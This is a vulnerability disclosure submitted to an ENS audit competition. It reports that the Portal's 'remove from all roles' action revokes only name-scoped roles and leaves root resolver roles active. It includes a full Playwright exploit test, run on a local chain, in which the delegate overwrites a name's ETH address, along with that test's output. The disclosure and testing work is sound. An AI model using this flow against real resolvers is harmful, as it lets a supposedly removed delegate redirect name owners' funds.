# 92352 w a critical portal says it removed all roles but sends a one name revoke

**Submitted on Sep 9th 2026 at 06:37:44 UTC by @Tradi3 for** [**Audit Competition | ENS**](https://immunefi.com/audit-competition/audit-competition-ens)

* **Report ID:** #92352
* **Report Type:** Websites & Apps
* **Report severity:** Critical
* **Target:** <https://github.com/immunefi-team/audit-comp-ens/tree/audit-comp-ready/apps/portal>
* **Impacts:**
  * Malicious interactions with an already-connected wallet, such as: Modifying transaction arguments or parameters Substituting contract addresses Submitting malicious transactions Signing or submitting a transaction against the wrong chain (for example when the request's target chain is not validated) Inducing a blanket token approval (for example setApprovalForAll on the registry or NameWrapper) to an attacker-controlled address

## Description

### Summary

Portal groups one account's root-scoped and name-scoped resolver permissions into one row labelled “Global roles (all names).” Its confirmation says the account will be removed “from all roles.” The transaction builder does not preserve those resources: it unions the displayed role bits, selects one non-root name, and sends a single name-scoped revoke to the connected wallet.

The PoC signs and mines the Portal transaction successfully. The name role is removed, but root ROLE\_SET\_ADDR and ROLE\_UPGRADE remain. The allegedly removed account uses the retained root authority to change the name's ETH address. A later root-role revoke stops new writes but does not restore the address already changed.

The in-scope security event does not depend on a resolver or indexer defect: Portal itself constructs and sends calldata for the wrong resource. The contract correctly enforces exactly what Portal sent.

### Vulnerability details

`apps/portal/src/lib/roles/resolverRoles.ts:179-220` groups role records by account rather than account plus resource. Lines 199-204 append every resource's decoded bits and labels to the existing account row, so root and name permissions become one `decodedRoles` list and one `resolvedNames` set.

`apps/portal/src/features/resolver/components/ResolverRolesSidebar.tsx:165-169` derives only one transaction name:

```ts
const decodedRoles = (row?.original.decodedRoles ?? []) as ResolverRoleKey[]
const resolvedNames = row?.original.resolvedNames ?? []
const roleName = resolvedNames.find((n) => n !== '(root)') ?? ''
```

The same component labels that mixed row `Global roles (all names)` at lines 391-395, and its confirmation at lines 441-462 asks:

```
Are you sure you want to remove this user from all roles?
```

The Remove handler at lines 307-323 passes the union bitmap with only `roleName`. `apps/portal/src/features/resolver/helpers/revokeResolverRoles.ts:45-60` selects root scope only when `name` is empty:

```ts
name === ''
  ? { scope: 'root', roles, targetAccount: account, resolverAddress }
  : { scope: 'name', name, roles, targetAccount: account, resolverAddress }
```

There is no per-resource loop. Once any name is present, Portal submits one authorizeNameRoles(name, unionBitmap, target, false) transaction and never revokes the root resource.

### Reviewed intent versus signed transaction

The UI presents one security action:

* remove this account from all roles;
* the row covers root and name resources.

The required on-chain result therefore needs both:

* a root-resource revoke for the displayed root roles; and
* a name-resource revoke for the displayed name roles.

Portal instead asks the wallet to sign only:

```
authorizeNameRoles(selectedName, unionOfRootAndNameBits, target, false)
```

Putting a root-role bit in a name-resource bitmap does not revoke the root resource. The user-approved intent and signed resource argument are objectively different.

### Attack path

1. A resolver delegate has root ROLE\_SET\_ADDR | ROLE\_UPGRADE and a name-scoped ROLE\_SET\_TEXT.
2. Portal combines both resources into one “Global roles (all names)” row.
3. The owner clicks Remove User and confirms removal “from all roles.”
4. Portal sends one wallet request. The owner signs it.
5. The mined transaction is a name-scoped revoke with the union bitmap. It removes the name role while both root roles remain.
6. The removed delegate later uses retained root ROLE\_SET\_ADDR to replace the name's ETH address.
7. Revoking the root role prevents later writes but does not restore the overwritten address.

There is no timing race or second owner action after removal. The delegate was previously authorized and the owner can recover; both limitations are disclosed.

### Impact

The selected impact occurs at the connected-wallet boundary: Portal converts an all-resource removal into calldata for one name resource. The user signs a different authorization change from the one Portal presents.

The retained authority is material, not cosmetic. The E2E proves it changes the ETH address and that revocation alone does not undo the write. The downstream call demonstrates why the wrong wallet arguments matter; it does not allege a vulnerability in the resolver contract.

The owner can revoke the surviving role and restore the address with separate transactions, so this is not a claim of theft or irreversible ownership loss. The previously authorized delegate and recovery path may reduce adjudicated severity, but they do not change the wallet-signed wrong-resource transaction.

### Why the Portal action itself is in scope

* **“The critical consequence requires a direct call to the out-of-scope resolver contract.”** The selected impact is already complete when in-scope Portal constructs and sends one-name revoke calldata for an all-resource UI action. The later call only proves the retained permission is security-sensitive.
* **“The resolver contract is out of scope.”** The contract behaves correctly for the calldata Portal supplied. The negative control sends the missing root revoke and proves the same delegate write then fails.
* **“The indexer/subgraph faithfully serves the changed state.”** The PoC does not source the before/after ETH address from the indexer. Explorer resolves the value from the live local chain; the core wrong-calldata proof does not require Explorer at all.
* **“The delegate already had authority.”** The vulnerability is that a successful Portal security revocation leaves that authority active after telling the owner it was removed.
* **“The state is recoverable.”** Recovery needs both a separate root revoke and a separate address correction; no permanent takeover is claimed.

### Prior-report and duplicate disclosure

I previously reported this root as #89611 and then #91095; Immunefi matched it to private report #89387. This version asks for one assessment of that same root and includes the full proof without relying on access to the earlier reports.

## Link to Proof of Concept

<https://gist.github.com/krutftw/79fce47c0d4077a637f2c5165e516746>

## Proof of Concept

Tested against the competition repository's `audit-comp-ready` HEAD `1c9b47f18fcddd2e864dfe385c4171061c9811ae`. Its import commit identifies upstream audited revision `63772fd872af472ced58b009499355f3430c2a86`; the later branch commit only updates Hono, and `git diff` confirms the affected Portal source is unchanged. The Playwright config uses `bypassCSP: true` only because Vite injects an inline React-refresh preamble in development; it does not alter role grouping, displayed text, transaction construction, wallet requests, or chain execution.

Save the embedded files as:

* e2e/projects/portal/tests/poc-resolver-role-collapse-ui-send.spec.ts
* e2e/projects/portal/playwright.portal-role-collapse.config.ts
* 115490-VERIFICATION-20260909.txt

Unlisted evidence mirror with the same three hashed files: <https://gist.github.com/krutftw/79fce47c0d4077a637f2c5165e516746>

Install dependencies and start the local stack from the repository root:

```bash
pnpm install --frozen-lockfile
pnpm e2e:infra:up
```

Start Portal on the PoC's port in another terminal. The committed CI environment points it at the local stack:

```bash
pnpm --filter portal dev --mode ci --port 3002
```

Then run the PoC from the repository root:

```bash
PORTAL_APP_URL=http://localhost:3002 \
pnpm --filter @ens-apps/e2e exec playwright test \
  --config projects/portal/playwright.portal-role-collapse.config.ts \
  --reporter=list
```

After the test, stop the Portal process and run `pnpm e2e:infra:down`.

Canonical result:

```
[resolver-role-collapse] ui-row=Global roles (all names)
[resolver-role-collapse] ui-confirmation=remove from all roles
[resolver-role-collapse] ui-call=authorizeNameRoles
[resolver-role-collapse] ui-scope=name:portal-role-collapse-1788927187.eth
[resolver-role-collapse] ui-union-bitmap=21267647932558653966460912964485513233
[resolver-role-collapse] root-revoke-in-ui-tx=false
[resolver-role-collapse] name=portal-role-collapse-1788927187.eth
[resolver-role-collapse] resolver=0x57D57EffD9185DdA286AcD5100381CfD46982ac6
[resolver-role-collapse] target=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[resolver-role-collapse] explorer-before=0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
[resolver-role-collapse] ui-tx=0x4d1c9d44a6264876a7cc465109a31dda3d2741b210741c27156d7a2b8737b52f
[resolver-role-collapse] ui-status=success
[resolver-role-collapse] name-role-after-ui=false
[resolver-role-collapse] root-roles-after-ui=true
[resolver-role-collapse] exploit-tx=0xa0e887284192058bbfcc8a4dcdf6b97ef0413d89a5129dfc8e876d3f691d430d
[resolver-role-collapse] final-address=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[resolver-role-collapse] root-roles-after-corrective-revoke=false
[resolver-role-collapse] write-blocked-after-corrective-revoke=true
[resolver-role-collapse] address-after-corrective-revoke=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
[resolver-role-collapse] explorer-after=0x70997970C51812dc3A010C7d01b50e0d17dc79C8
1 passed (1.1m)
```

The test first creates and reads both exact grants on the local chain, then mirrors those same records through the local GraphQL route so Portal can load. The Portal grouping, confirmation, wallet request, mined calldata, role reads, delegate write, corrective revoke, post-revoke failed-write negative control, and address reads are real. No mocked lag or fabricated authority is used.

SHA-256:

```
7450e090a7c41efefb1cc8e30908ed34c01a4b5a96839c0a8be1fbfa1f3a5648  poc-resolver-role-collapse-ui-send.spec.ts
a6b7feadc91bc4fbc5c3a8ac65e60dcb22e17ca2344194b4b149d89013834e65  playwright.portal-role-collapse.config.ts
a93ab24b7a4d3e009fc22567ccf4fd73fd56b35b715935a754781e614df46c04  115490-VERIFICATION-20260909.txt
```

Full exact test:

```ts
import { getResolver } from '@ensdomains/ensjs/public'
import {
  type Web3ProviderBackend,
  Web3RequestKind,
} from '@ensdomains/headless-web3-provider'
import type { Page } from '@playwright/test'
import {
  type Address,
  decodeFunctionData,
  encodeFunctionData,
  namehash,
  parseAbi,
  toHex,
} from 'viem'
import { privateKeyToAccount } from 'viem/accounts'
import { packetToBytes } from 'viem/ens'
import {
  computeNameResource,
  resolverRoles,
} from '../../../../apps/portal/src/lib/roles/resolverRoles.js'
import { expect, test } from '../../../fixtures/playwright.portal.fixture.js'
import { publicClient, walletClient } from '../../../helpers/anvil-client.js'
import { authorizeTransaction } from '../../../helpers/portal-auth.js'

const PORTAL_APP_URL = process.env.PORTAL_APP_URL ?? 'http://localhost:3002'
const INDEXER_URL = 'http://127.0.0.1:5655/graphql'
const ROOT_RESOURCE = `0x${'00'.repeat(32)}`

const resolverAbi = parseAbi([
  'function grantRootRoles(uint256 roleBitmap, address account) returns (bool)',
  'function revokeRootRoles(uint256 roleBitmap, address account) returns (bool)',
  'function authorizeNameRoles(bytes toName, uint256 roleBitmap, address account, bool grant) returns (bool)',
  'function hasRootRoles(uint256 roleBitmap, address account) view returns (bool)',
  'function hasRoles(uint256 resource, uint256 roleBitmap, address account) view returns (bool)',
  'function setAddr(bytes32 node, address addr)',
  'function addr(bytes32 node) view returns (address)',
])

async function waitForReceipt(hash: `0x${string}`) {
  const receipt = await publicClient.waitForTransactionReceipt({ hash })
  expect(receipt.status).toBe('success')
  return receipt
}

async function connectPortal(
  page: Page,
  wallet: Web3ProviderBackend,
): Promise<void> {
  const connectButton = page
    .getByRole('button', { name: /^Connect(?:\s|$)/i })
    .first()
  await connectButton.waitFor({ state: 'visible', timeout: 15_000 })
  await connectButton.click()
  await page.getByText('Headless Web3 Provider').click()

  await expect
    .poll(
      () => wallet.getPendingRequestCount(Web3RequestKind.RequestPermissions),
      { timeout: 15_000 },
    )
    .toBeGreaterThanOrEqual(1)
  await wallet.authorize(Web3RequestKind.RequestPermissions)
  await expect
    .poll(
      () => wallet.getPendingRequestCount(Web3RequestKind.RequestAccounts),
      { timeout: 15_000 },
    )
    .toBeGreaterThanOrEqual(1)
  await wallet.authorize(Web3RequestKind.RequestAccounts)
  await expect(connectButton).not.toBeVisible({ timeout: 15_000 })
}

async function driveSingleTransactionToSuccess(
  page: Page,
  wallet: Web3ProviderBackend,
  transactionId: string,
): Promise<void> {
  const dialog = page.locator('[data-slot="dialog-content"][data-state="open"]')
  await expect(dialog).toBeVisible({ timeout: 30_000 })

  let succeeded = false
  const onConsole = (msg: { text(): string }) => {
    if (msg.text().includes(`Transaction ${transactionId} state: success`)) {
      succeeded = true
    }
  }
  page.on('console', onConsole)

  try {
    const deadline = Date.now() + 120_000
    while (Date.now() < deadline) {
      const openWallet = dialog.getByRole('button', { name: /open wallet/i })
      if (await openWallet.isVisible().catch(() => false)) {
        console.log('[resolver-role-collapse] clicking Open wallet')
        await openWallet.click()
        console.log(
          `[resolver-role-collapse] pending-send=${wallet.getPendingRequestCount(Web3RequestKind.SendTransaction)}`,
        )
        await authorizeTransaction(wallet, 60_000)
        console.log('[resolver-role-collapse] wallet request authorized')
        await page.waitForTimeout(500)
        continue
      }

      const waiting = dialog.getByRole('button', { name: /^Waiting\.\.\.$/i })
      if (await waiting.isVisible().catch(() => false)) {
        const walletIcon = waiting.locator('xpath=preceding-sibling::button[1]')
        if (await walletIcon.isVisible().catch(() => false)) {
          console.log('[resolver-role-collapse] clicking wallet icon')
          await walletIcon.click()
          await authorizeTransaction(wallet, 60_000)
          console.log('[resolver-role-collapse] wallet request authorized')
          await page.waitForTimeout(500)
          continue
        }
      }

      const primary = dialog.getByRole('button', {
        name: /^(Start|Next|Done)$/i,
      })
      if (
        (await primary.isVisible().catch(() => false)) &&
        (await primary.isEnabled().catch(() => false))
      ) {
        console.log(
          `[resolver-role-collapse] clicking transaction button=${await primary.textContent()}`,
        )
        await primary.click()
        await page.waitForTimeout(500)
        continue
      }

      if (succeeded) break
      await page.waitForTimeout(500)
    }
  } finally {
    page.off('console', onConsole)
  }

  expect(succeeded).toBe(true)
}

async function findExactTransaction(
  fromBlock: bigint,
  to: Address,
  from: Address,
) {
  const latest = await publicClient.getBlockNumber({ cacheTime: 0 })
  console.log(
    `[resolver-role-collapse] block-search=${fromBlock + 1n}..${latest}`,
  )
  for (let blockNumber = fromBlock + 1n; blockNumber <= latest; blockNumber++) {
    const block = await publicClient.getBlock({
      blockNumber,
      includeTransactions: true,
    })
    for (const transaction of block.transactions) {
      if (
        typeof transaction !== 'string' &&
        transaction.to?.toLowerCase() === to.toLowerCase() &&
        transaction.from.toLowerCase() === from.toLowerCase() &&
        transaction.input.startsWith('0xbbd9abb5')
      ) {
        return transaction
      }
    }
  }
  return null
}

test.describe('Portal mixed-scope resolver-role removal', () => {
  test.setTimeout(240_000)

  test('sends the UI transaction and leaves root authority usable', async ({
    portalPage,
    wallet,
    accounts,
    makeName,
  }) => {
    await portalPage.reload({ waitUntil: 'domcontentloaded' })

    const owner = privateKeyToAccount(accounts.getPrivateKey('user'))
    const target = privateKeyToAccount(accounts.getPrivateKey('user2'))
    const name = await makeName({
      label: 'portal-role-collapse',
      owner: 'user',
      records: [{ key: 'url', value: 'https://safe.example' }],
    })
    const resolverAddress = await getResolver(publicClient, { name })
    expect(resolverAddress).toBeTruthy()

    await waitForReceipt(
      await walletClient.writeContract({
        account: owner,
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [namehash(name), owner.address],
      }),
    )

    const rootBitmap = resolverRoles.ROLE_SET_ADDR | resolverRoles.ROLE_UPGRADE
    const nameBitmap = resolverRoles.ROLE_SET_TEXT

    await waitForReceipt(
      await walletClient.writeContract({
        account: owner,
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'grantRootRoles',
        args: [rootBitmap, target.address],
      }),
    )
    await waitForReceipt(
      await walletClient.writeContract({
        account: owner,
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'authorizeNameRoles',
        args: [toHex(packetToBytes(name)), nameBitmap, target.address, true],
      }),
    )

    const nameResource = computeNameResource(name)
    expect(
      await publicClient.readContract({
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'hasRootRoles',
        args: [rootBitmap, target.address],
      }),
    ).toBe(true)
    expect(
      await publicClient.readContract({
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'hasRoles',
        args: [BigInt(nameResource), nameBitmap, target.address],
      }),
    ).toBe(true)

    await portalPage.route(INDEXER_URL, async (route) => {
      const body = route.request().postDataJSON() as { query?: string }
      if (body.query?.includes('getNamesForAddress')) {
        await route.fulfill({ json: { data: { domains: [] } } })
        return
      }

      if (body.query?.includes('query getRecords')) {
        await route.fulfill({
          json: {
            data: {
              domains: [
                {
                  resolver: {
                    texts: [],
                    addresses: [],
                  },
                },
              ],
            },
          },
        })
        return
      }

      if (!body.query?.includes('getResolverOverview')) {
        await route.fulfill({ json: { data: {} } })
        return
      }

      await route.fulfill({
        json: {
          data: {
            resolver: {
              id: resolverAddress.toLowerCase(),
              address: resolverAddress.toLowerCase(),
              nodeCount: 1,
              aliasCount: 0,
              roleHolderCount: 2,
              nodes: [
                {
                  id: namehash(name),
                  name,
                  owner: { id: owner.address.toLowerCase() },
                  resolver: {
                    id: resolverAddress.toLowerCase(),
                    address: resolverAddress.toLowerCase(),
                  },
                },
              ],
              aliases: [],
              roles: [
                {
                  account: target.address.toLowerCase(),
                  resource: ROOT_RESOURCE,
                  roleBitmap: `0x${rootBitmap.toString(16)}`,
                  blockNumber: 1,
                  transactionHash: null,
                  timestamp: null,
                  name: null,
                },
                {
                  account: target.address.toLowerCase(),
                  resource: nameResource,
                  roleBitmap: `0x${nameBitmap.toString(16)}`,
                  blockNumber: 2,
                  transactionHash: null,
                  timestamp: null,
                  name,
                },
              ],
              events: [],
            },
          },
        },
      })
    })

    await connectPortal(portalPage, wallet)

    await portalPage.goto(`${PORTAL_APP_URL}/${name}/address`)
    await expect(
      portalPage.getByRole('heading', { name: 'Address Resolution' }),
    ).toBeVisible({ timeout: 30_000 })
    const safeMainnetRow = portalPage
      .getByRole('row')
      .filter({ hasText: 'Mainnet' })
    await expect(safeMainnetRow).toContainText(new RegExp(owner.address, 'i'))

    await portalPage.goto(`${PORTAL_APP_URL}/resolver/${resolverAddress}/roles`)
    await expect(
      portalPage.getByRole('heading', { name: 'Roles' }),
    ).toBeVisible({
      timeout: 30_000,
    })
    await expect(portalPage.getByText('(root)', { exact: true })).toBeVisible()
    await expect(portalPage.getByText(name, { exact: true })).toBeVisible()

    await portalPage.getByRole('button', { name: 'Edit user roles' }).click()
    await expect(
      portalPage.getByText('Global roles (all names)', { exact: true }),
    ).toBeVisible()
    console.log('[resolver-role-collapse] ui-row=Global roles (all names)')
    await portalPage.getByRole('button', { name: 'Remove user' }).click()
    const confirmation = portalPage.getByRole('dialog', {
      name: 'Remove user',
    })
    await expect(
      confirmation.getByText(
        'Are you sure you want to remove this user from all roles? This action cannot be undone.',
      ),
    ).toBeVisible()
    console.log(
      '[resolver-role-collapse] ui-confirmation=remove from all roles',
    )
    const beforeUiTransaction = await publicClient.getBlockNumber({
      cacheTime: 0,
    })
    await confirmation
      .getByRole('button', { name: 'Remove', exact: true })
      .click()
    await driveSingleTransactionToSuccess(
      portalPage,
      wallet,
      'tx-remove-resolver-user',
    )

    const unionBitmap = rootBitmap | nameBitmap
    const expectedWrongCall = encodeFunctionData({
      abi: resolverAbi,
      functionName: 'authorizeNameRoles',
      args: [toHex(packetToBytes(name)), unionBitmap, target.address, false],
    })
    const uiTransaction = await findExactTransaction(
      beforeUiTransaction,
      resolverAddress,
      owner.address,
    )
    expect(uiTransaction).not.toBeNull()
    if (!uiTransaction) throw new Error('UI transaction was not mined')
    const uiReceipt = await publicClient.getTransactionReceipt({
      hash: uiTransaction.hash,
    })
    expect(uiReceipt.status).toBe('success')
    expect(uiTransaction.input.toLowerCase()).toBe(
      expectedWrongCall.toLowerCase(),
    )
    const decodedUiCall = decodeFunctionData({
      abi: resolverAbi,
      data: uiTransaction.input,
    })
    expect(decodedUiCall.functionName).toBe('authorizeNameRoles')
    expect(decodedUiCall.args).toEqual([
      toHex(packetToBytes(name)),
      unionBitmap,
      target.address,
      false,
    ])
    console.log(
      `[resolver-role-collapse] ui-call=${decodedUiCall.functionName}`,
    )
    console.log(`[resolver-role-collapse] ui-scope=name:${name}`)
    console.log(`[resolver-role-collapse] ui-union-bitmap=${unionBitmap}`)
    console.log('[resolver-role-collapse] root-revoke-in-ui-tx=false')

    expect(
      await publicClient.readContract({
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'hasRoles',
        args: [BigInt(nameResource), nameBitmap, target.address],
      }),
    ).toBe(false)
    expect(
      await publicClient.readContract({
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'hasRootRoles',
        args: [rootBitmap, target.address],
      }),
    ).toBe(true)

    const attackHash = await walletClient.writeContract({
      account: target,
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'setAddr',
      args: [namehash(name), target.address],
    })
    await waitForReceipt(attackHash)
    const resolvedAddress = await publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'addr',
      args: [namehash(name)],
    })
    expect(resolvedAddress.toLowerCase()).toBe(target.address.toLowerCase())

    await waitForReceipt(
      await walletClient.writeContract({
        account: owner,
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'revokeRootRoles',
        args: [rootBitmap, target.address],
      }),
    )
    expect(
      await publicClient.readContract({
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'hasRootRoles',
        args: [rootBitmap, target.address],
      }),
    ).toBe(false)
    let blockedAfterCorrectiveRevoke = false
    try {
      await publicClient.simulateContract({
        account: target,
        address: resolverAddress,
        abi: resolverAbi,
        functionName: 'setAddr',
        args: [namehash(name), owner.address],
      })
    } catch {
      blockedAfterCorrectiveRevoke = true
    }
    expect(blockedAfterCorrectiveRevoke).toBe(true)
    const addressAfterRoleRevocation = await publicClient.readContract({
      address: resolverAddress,
      abi: resolverAbi,
      functionName: 'addr',
      args: [namehash(name)],
    })
    expect(addressAfterRoleRevocation.toLowerCase()).toBe(
      target.address.toLowerCase(),
    )

    // Reopen the public in-scope Explorer view after the attack. A full reload
    // discards the earlier safe profile query rather than relying on a refetch.
    await portalPage.goto(`${PORTAL_APP_URL}/${name}/address`)
    await portalPage.reload({ waitUntil: 'domcontentloaded' })
    await expect(
      portalPage.getByRole('heading', { name: 'Address Resolution' }),
    ).toBeVisible({ timeout: 30_000 })
    const attackedMainnetRow = portalPage
      .getByRole('row')
      .filter({ hasText: 'Mainnet' })
    await expect(attackedMainnetRow).toContainText(
      new RegExp(target.address, 'i'),
    )

    console.log(`[resolver-role-collapse] name=${name}`)
    console.log(`[resolver-role-collapse] resolver=${resolverAddress}`)
    console.log(`[resolver-role-collapse] target=${target.address}`)
    console.log(`[resolver-role-collapse] explorer-before=${owner.address}`)
    console.log(`[resolver-role-collapse] ui-tx=${uiTransaction.hash}`)
    console.log(`[resolver-role-collapse] ui-status=${uiReceipt.status}`)
    console.log('[resolver-role-collapse] name-role-after-ui=false')
    console.log('[resolver-role-collapse] root-roles-after-ui=true')
    console.log(`[resolver-role-collapse] exploit-tx=${attackHash}`)
    console.log(`[resolver-role-collapse] final-address=${resolvedAddress}`)
    console.log(
      '[resolver-role-collapse] root-roles-after-corrective-revoke=false',
    )
    console.log(
      `[resolver-role-collapse] write-blocked-after-corrective-revoke=${blockedAfterCorrectiveRevoke}`,
    )
    console.log(
      `[resolver-role-collapse] address-after-corrective-revoke=${addressAfterRoleRevocation}`,
    )
    console.log(`[resolver-role-collapse] explorer-after=${target.address}`)
  })
})
```

Full exact Playwright config:

```ts
import { defineConfig } from '@playwright/test'
import { baseConfig } from '../../playwright.config.base.js'

export default defineConfig({
  ...baseConfig,
  testDir: './tests',
  use: {
    ...baseConfig.use,
    baseURL: process.env.PORTAL_APP_URL ?? 'http://localhost:3002',
    // The Vite development server injects an inline React-refresh preamble.
    // Its production CSP blocks that dev-only preamble before the app mounts.
    bypassCSP: true,
  },
  projects: [
    {
      name: 'portal-role-collapse-e2e',
      testMatch: /poc-resolver-role-collapse-ui-send\.spec\.ts$/,
    },
  ],
})
```

### Expected behavior

An action presented as removing an account from all roles must revoke every displayed account/resource pair, or Portal must require separately reviewed transactions for each resource.

### Actual behavior

Portal signs and mines one name-scoped revoke containing a union of unrelated resource bits. The operation reports success while root authority remains.

### Recommended fix

Key displayed roles by account and resource. Generate one exact revoke per root/name resource, list every transaction before signature, and verify the final bitmap for each resource. The smallest safe UI alternative is one row and one removal action per account/resource pair.
